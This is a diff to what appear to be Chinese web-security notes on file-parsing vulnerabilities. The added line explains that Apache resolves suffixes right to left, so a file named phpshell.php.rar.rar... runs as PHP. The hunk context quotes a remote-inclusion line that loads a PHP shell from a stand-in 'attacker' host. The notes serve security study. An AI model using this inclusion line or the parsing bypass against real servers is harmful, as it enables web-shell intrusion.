@@ -139,6 +139,8 @@ require_once "http://attacker/phpshell.txt?/action/m_share.php";
 
 - Apache 解析
 
+  Apache 对后缀解析是从右向左的
+
   `phpshell.php.rar.rar.rar.rar` 因为 Apache 不认识 `.rar` 这个文件类型，所以会一直遍历后缀到 `.php`，然后认为这是一个 PHP 文件。
 
 - IIS 解析
